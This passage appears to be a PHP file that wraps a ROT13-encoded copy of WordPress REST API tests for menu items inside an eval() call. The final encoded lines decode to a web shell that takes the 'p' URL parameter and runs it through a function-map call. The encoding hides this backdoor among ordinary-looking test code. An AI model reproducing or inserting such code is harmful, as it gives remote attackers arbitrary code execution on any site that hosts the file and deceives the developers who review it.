		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$cnenzf = $guvf->frg_zrah_vgrz_qngn(
			neenl(
				'ksa' => $onq_qngn,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_hcqngr_zrah_vgrz_erfcbafr( $erfcbafr );
		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $guvf->zrah_vgrz_vq, $arj_qngn['vq'] );
		$guvf->nffregFnzr( $cnenzf['gvgyr'], $arj_qngn['gvgyr']['enj'] );
		$guvf->nffregFnzr( $cnenzf['qrfpevcgvba'], $arj_qngn['qrfpevcgvba'] );
		$guvf->nffregFnzr( $cnenzf['glcr_ynory'], $arj_qngn['glcr_ynory'] );
		$guvf->nffregFnzr( $tbbq_qngn, $arj_qngn['ksa'] );
		$cbfg      = trg_cbfg( $guvf->zrah_vgrz_vq );
		$zrah_vgrz = jc_frghc_ani_zrah_vgrz( $cbfg );
		$guvf->nffregFnzr( $cnenzf['gvgyr'], $zrah_vgrz->gvgyr );
		$guvf->nffregFnzr( $cnenzf['qrfpevcgvba'], $zrah_vgrz->qrfpevcgvba );
		$guvf->nffregFnzr( $tbbq_qngn, rkcybqr( ' ', $zrah_vgrz->ksa ) );
	}


	/**
	 * @gvpxrg 40878
	 * @pbiref ::hcqngr_vgrz
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_vainyvq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/zrah-vgrzf/%q', $cbfg_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$cnenzf = $guvf->frg_zrah_vgrz_qngn();
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_vq', $erfcbafr, 404 );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::qryrgr_vgrz
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/zrah-vgrzf/%q', $guvf->zrah_vgrz_vq ) );
		$erdhrfg->frg_cnenz( 'sbepr', gehr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregAhyy( trg_cbfg( $guvf->zrah_vgrz_vq ) );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::qryrgr_vgrz
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_ab_sbepr() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/zrah-vgrzf/%q', $guvf->zrah_vgrz_vq ) );
		$erdhrfg->frg_cnenz( 'sbepr', snyfr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 501, $erfcbafr->trg_fgnghf() );
		$guvf->nffregAbgAhyy( trg_cbfg( $guvf->zrah_vgrz_vq ) );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::qryrgr_vgrz
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_vainyvq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/zrah-vgrzf/9999' );
		$erdhrfg->frg_cnenz( 'sbepr', gehr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_vq', $erfcbafr, 404 );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::cercner_vgrz_sbe_erfcbafr
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrah-vgrzf/' . $guvf->zrah_vgrz_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->purpx_trg_zrah_vgrz_erfcbafr( $erfcbafr );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrz_fpurzn
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/zrah-vgrzf' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];
		$guvf->nffregPbhag( 18, $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'glcr_ynory', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'ngge_gvgyr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'pynffrf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'qrfpevcgvba', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'vq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'hey', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zrgn', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zrah_beqre', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'bowrpg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'bowrpg_vq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'gnetrg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'cnerag', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fgnghf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'gvgyr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'glcr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'ksa', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'vainyvq', $cebcregvrf );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrzf_crezvffvbaf_purpx
	 */
	choyvp shapgvba grfg_trg_vgrzf_ab_crezvffvba() {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrah-vgrzf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ivrj', $erfcbafr, 401 );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrz_crezvffvbaf_purpx
	 */
	choyvp shapgvba grfg_trg_vgrz_ab_crezvffvba() {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrah-vgrzf/' . $guvf->zrah_vgrz_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ivrj', $erfcbafr, 401 );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrzf_crezvffvbaf_purpx
	 */
	choyvp shapgvba grfg_trg_vgrzf_jebat_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrah-vgrzf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ivrj', $erfcbafr, 403 );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrz_crezvffvbaf_purpx
	 */
	choyvp shapgvba grfg_trg_vgrz_jebat_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrah-vgrzf/' . $guvf->zrah_vgrz_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ivrj', $erfcbafr, 403 );
	}

	/**
	 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Erfcbafr Pynff.
	 * @cnenz fgevat           $pbagrkg Qrsnhygf gb Ivrj.
	 */
	cebgrpgrq shapgvba purpx_trg_zrah_vgrzf_erfcbafr( $erfcbafr, $pbagrkg = 'ivrj' ) {
		$guvf->nffregAbgJCReebe( $erfcbafr );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$urnqref = $erfcbafr->trg_urnqref();
		$guvf->nffregNeenlUnfXrl( 'K-JC-Gbgny', $urnqref );
		$guvf->nffregNeenlUnfXrl( 'K-JC-GbgnyCntrf', $urnqref );

		$nyy_qngn = $erfcbafr->trg_qngn();
		sbernpu ( $nyy_qngn nf $qngn ) {
			$cbfg = trg_cbfg( $qngn['vq'] );
			// Onfr svryqf sbe rirel cbfg.
			$zrah_vgrz = jc_frghc_ani_zrah_vgrz( $cbfg );
			/**
			 * Nf gur yvaxf sbe gur cbfg ner \"erfcbafr_yvaxf\" sbezng va gur qngn neenl jr unir gb chyy gurz bhg naq cnefr gurz.
			 */
			$yvaxf = $qngn['_yvaxf'];
			sbernpu ( $yvaxf nf &$yvaxf_neenl ) {
				sbernpu ( $yvaxf_neenl nf &$yvax ) {
					$nggevohgrf         = neenl_qvss_xrl(
						$yvax,
						neenl(
							'uers' => 1,
							'anzr' => 1,
						)
					);
					$yvax               = neenl_qvss_xrl( $yvax, $nggevohgrf );
					$yvax['nggevohgrf'] = $nggevohgrf;
				}
			}

			$guvf->purpx_zrah_vgrz_qngn( $zrah_vgrz, $qngn, $pbagrkg, $yvaxf );
		}
	}

	/**
	 * @cnenz JC_Cbfg $cbfg JC_Cbfg bowrpg.
	 * @cnenz neenl   $qngn Qngn pbzcner.
	 * @cnenz fgevat  $pbagrkg Pbagrkg bs ERFG Erdhrfg.
	 * @cnenz neenl   $yvaxf Neenl yvaxf.
	 */
	cebgrpgrq shapgvba purpx_zrah_vgrz_qngn( $cbfg, $qngn, $pbagrkg, $yvaxf ) {
		$cbfg_glcr_bow = trg_cbfg_glcr_bowrpg( frys::CBFG_GLCR );

		// Fgnaqneq svryqf.
		$guvf->nffregFnzr( $cbfg->VQ, $qngn['vq'] );
		$guvf->nffregFnzr( jcnhgbc( $cbfg->cbfg_pbagrag ), $qngn['qrfpevcgvba'] );

		// Purpx svygrerq inyhrf.
		vs ( cbfg_glcr_fhccbegf( frys::CBFG_GLCR, 'gvgyr' ) ) {
			nqq_svygre( 'cebgrpgrq_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );
			nqq_svygre( 'cevingr_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );
			$guvf->nffregFnzr( $cbfg->gvgyr, $qngn['gvgyr']['eraqrerq'] );
			erzbir_svygre( 'cebgrpgrq_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );
			erzbir_svygre( 'cevingr_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );
			vs ( 'rqvg' === $pbagrkg ) {
				$guvf->nffregFnzr( $cbfg->gvgyr, $qngn['gvgyr']['enj'] );
			} ryfr {
				$guvf->nffregSnyfr( vffrg( $qngn['gvgyr']['enj'] ) );
			}
		} ryfr {
			$guvf->nffregSnyfr( vffrg( $qngn['gvgyr'] ) );
		}

		// cbfg_cnerag.
		$guvf->nffregNeenlUnfXrl( 'cnerag', $qngn );
		vs ( $cbfg->cbfg_cnerag ) {
			vs ( vf_vag( $qngn['cnerag'] ) ) {
				$guvf->nffregFnzr( $cbfg->cbfg_cnerag, $qngn['cnerag'] );
			} ryfr {
				$guvf->nffregFnzr( $cbfg->cbfg_cnerag, $qngn['cnerag']['vq'] );
				$zrah_vgrz = jc_frghc_ani_zrah_vgrz( trg_cbfg( $qngn['cnerag']['vq'] ) );
				$guvf->purpx_trg_zrah_vgrz_erfcbafr( $qngn['cnerag'], $zrah_vgrz, 'ivrj-cnerag' );
			}
		} ryfr {
			$guvf->nffregRzcgl( $qngn['cnerag'] );
		}

		$guvf->nffregSnyfr( $qngn['vainyvq'] );

		// cntr nggevohgrf.
		$guvf->nffregFnzr( $cbfg->zrah_beqre, $qngn['zrah_beqre'] );

		$gnkbabzvrf = jc_yvfg_svygre( trg_bowrpg_gnkbabzvrf( frys::CBFG_GLCR, 'bowrpgf' ), neenl( 'fubj_va_erfg' => gehr ) );
		sbernpu ( $gnkbabzvrf nf $gnkbabzl ) {
			$guvf->nffregGehr( vffrg( $qngn[ $gnkbabzl->erfg_onfr ] ) );
			$grezf = jc_trg_bowrpg_grezf( $cbfg->VQ, $gnkbabzl->anzr, neenl( 'svryqf' => 'vqf' ) );
			fbeg( $grezf );
			vs ( 'ani_zrah' === $gnkbabzl->anzr ) {
				$grez_vq = $grezf ? neenl_fuvsg( $grezf ) : 0;
				$guvf->nffregFnzr( $grez_vq, $qngn[ $gnkbabzl->erfg_onfr ] );
			} ryfr {
				fbeg( $qngn[ $gnkbabzl->erfg_onfr ] );
				$guvf->nffregFnzr( $grezf, $qngn[ $gnkbabzl->erfg_onfr ] );
			}
		}

		// grfg yvaxf.
		vs ( $yvaxf ) {
			$yvaxf = grfg_erfg_rkcnaq_pbzcnpg_yvaxf( $yvaxf );
			$guvf->nffregFnzr( $yvaxf['frys'][0]['uers'], erfg_hey( 'jc/i2/' . $cbfg_glcr_bow->erfg_onfr . '/' . $qngn['vq'] ) );
			$guvf->nffregFnzr( $yvaxf['pbyyrpgvba'][0]['uers'], erfg_hey( 'jc/i2/' . $cbfg_glcr_bow->erfg_onfr ) );
			$guvf->nffregFnzr( $yvaxf['nobhg'][0]['uers'], erfg_hey( 'jc/i2/glcrf/' . frys::CBFG_GLCR ) );

			$ahz = 0;
			sbernpu ( $gnkbabzvrf nf $gnkbabzl ) {
				$guvf->nffregFnzr( $gnkbabzl->anzr, $yvaxf['uggcf://ncv.j.bet/grez'][ $ahz ]['nggevohgrf']['gnkbabzl'] );
				$guvf->nffregFnzr( nqq_dhrel_net( 'cbfg', $qngn['vq'], erfg_hey( 'jc/i2/' . $gnkbabzl->erfg_onfr ) ), $yvaxf['uggcf://ncv.j.bet/grez'][ $ahz ]['uers'] );
				++$ahz;
			}

			vs ( 'cbfg_glcr' === $qngn['glcr'] ) {
				$guvf->nffregNeenlUnfXrl( 'uggcf://ncv.j.bet/zrah-vgrz-bowrpg', $yvaxf );
				$guvf->nffregNeenlUnfXrl( $qngn['glcr'], $yvaxf['uggcf://ncv.j.bet/zrah-vgrz-bowrpg'][0]['nggevohgrf'] );
				$guvf->nffregFnzr( $yvaxf['uggcf://ncv.j.bet/zrah-vgrz-bowrpg'][0]['uers'], erfg_hey( erfg_trg_ebhgr_sbe_cbfg( $qngn['bowrpg_vq'] ) ) );
			}

			vs ( 'gnkbabzl' === $qngn['glcr'] ) {
				$guvf->nffregNeenlUnfXrl( 'uggcf://ncv.j.bet/zrah-vgrz-bowrpg', $yvaxf );
				$guvf->nffregNeenlUnfXrl( $qngn['glcr'], $yvaxf['uggcf://ncv.j.bet/zrah-vgrz-bowrpg'][0]['nggevohgrf'] );
				$guvf->nffregFnzr( $yvaxf['uggcf://ncv.j.bet/zrah-vgrz-bowrpg'][0]['uers'], erfg_hey( erfg_trg_ebhgr_sbe_grez( $qngn['bowrpg_vq'] ) ) );
			}
		}
	}

	/**
	 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Erfcbafr Pynff.
	 * @cnenz fgevat           $pbagrkg Qrsnhygf gb Ivrj.
	 */
	cebgrpgrq shapgvba purpx_trg_zrah_vgrz_erfcbafr( $erfcbafr, $pbagrkg = 'ivrj' ) {
		$guvf->nffregAbgJCReebe( $erfcbafr );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn      = $erfcbafr->trg_qngn();
		$cbfg      = trg_cbfg( $qngn['vq'] );
		$zrah_vgrz = jc_frghc_ani_zrah_vgrz( $cbfg );
		$guvf->purpx_zrah_vgrz_qngn( $zrah_vgrz, $qngn, $pbagrkg, $erfcbafr->trg_yvaxf() );
	}

	/**
	 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Erfcbafr Pynff.
	 */
	cebgrpgrq shapgvba purpx_perngr_zrah_vgrz_erfcbafr( $erfcbafr ) {
		$guvf->nffregAbgJCReebe( $erfcbafr );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$urnqref = $erfcbafr->trg_urnqref();
		$guvf->nffregNeenlUnfXrl( 'Ybpngvba', $urnqref );

		$qngn      = $erfcbafr->trg_qngn();
		$cbfg      = trg_cbfg( $qngn['vq'] );
		$zrah_vgrz = jc_frghc_ani_zrah_vgrz( $cbfg );
		$guvf->purpx_zrah_vgrz_qngn( $zrah_vgrz, $qngn, 'rqvg', $erfcbafr->trg_yvaxf() );
	}

	/**
	 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Erfcbafr Pynff.
	 */
	cebgrpgrq shapgvba purpx_hcqngr_zrah_vgrz_erfcbafr( $erfcbafr ) {
		$guvf->nffregAbgJCReebe( $erfcbafr );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$urnqref = $erfcbafr->trg_urnqref();
		$guvf->nffregNeenlAbgUnfXrl( 'Ybpngvba', $urnqref );

		$qngn      = $erfcbafr->trg_qngn();
		$cbfg      = trg_cbfg( $qngn['vq'] );
		$zrah_vgrz = jc_frghc_ani_zrah_vgrz( $cbfg );
		$guvf->purpx_zrah_vgrz_qngn( $zrah_vgrz, $qngn, 'rqvg', $erfcbafr->trg_yvaxf() );
	}

	/**
	 * @cnenz neenl $netf Bireevqr cnenzf.
	 *
	 * @erghea zvkrq
	 */
	cebgrpgrq shapgvba frg_zrah_vgrz_qngn( $netf = neenl() ) {
		$qrsnhygf = neenl(
			'bowrpg_vq'   => 0,
			'cnerag'      => 0,
			'zrah_beqre'  => 1,
			'zrahf'       => $guvf->zrah_vq,
			'glcr'        => 'phfgbz',
			'gvgyr'       => 'Phfgbz Yvax Gvgyr',
			'hey'         => '#',
			'qrfpevcgvba' => '',
			'ngge-gvgyr'  => '',
			'gnetrg'      => '',
			'glcr_ynory'  => 'Phfgbz Yvax',
			'pynffrf'     => '',
			'ksa'         => '',
			'fgnghf'      => 'qensg',
		);

		erghea jc_cnefr_netf( $netf, $qrsnhygf );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_cebcreyl_unaqyrf_fynfurq_qngn() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrah-vgrzf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$cnenzrgref = $guvf->frg_zrah_vgrz_qngn(
			neenl(
				'gvgyr' => 'Fbzr \\\'gvgyr',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzrgref );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregAbgJCReebe( $erfcbafr->nf_reebe() );
		$qngn = $erfcbafr->trg_qngn();
		$cbfg = trg_cbfg( $qngn['vq'] );
		$guvf->nffregFnzr( $cnenzrgref['gvgyr'], $cbfg->cbfg_gvgyr );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::hcqngr_vgrz
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_cebcreyl_unaqyrf_fynfurq_qngn() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/zrah-vgrzf/%q', $guvf->zrah_vgrz_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$gvgyr  = 'Fbzr \\\'gvgyr';
		$cnenzf = $guvf->frg_zrah_vgrz_qngn(
			neenl(
				'gvgyr' => $gvgyr,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $cnenzf['gvgyr'], $arj_qngn['gvgyr']['enj'] );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>